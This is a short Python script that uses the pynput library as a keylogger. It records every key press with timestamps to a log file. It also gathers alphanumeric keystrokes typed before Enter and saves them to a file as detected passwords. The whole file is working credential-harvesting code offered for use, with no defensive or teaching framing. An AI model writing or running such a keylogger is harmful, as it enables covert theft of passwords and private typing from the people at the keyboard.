from pynput import keyboard
import logging

# Set up logging to log key presses to a file
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

# File to save detected passwords
password_file = 'passwords.txt'
detected_passwords = []

def on_press(key):
    try:
        # Log the alphanumeric keys
        logging.info(f'Key {key.char} pressed.')
        
        # Check for password input (you can customize this condition)
        if key.char in ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 
                        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']:
            detected_passwords.append(key.char)

    except AttributeError:
        # Log special keys
        logging.info(f'Special key {key} pressed.')
        
        # If the Enter key is pressed, save the detected password
        if key == keyboard.Key.enter:
            if detected_passwords:
                password = ''.join(detected_passwords)
                with open(password_file, 'a') as f:
                    f.write(password + '\n')
                detected_passwords.clear()  # Clear the list for the next password

def on_release(key):
    # Stop the listener if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Create a listener for key presses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()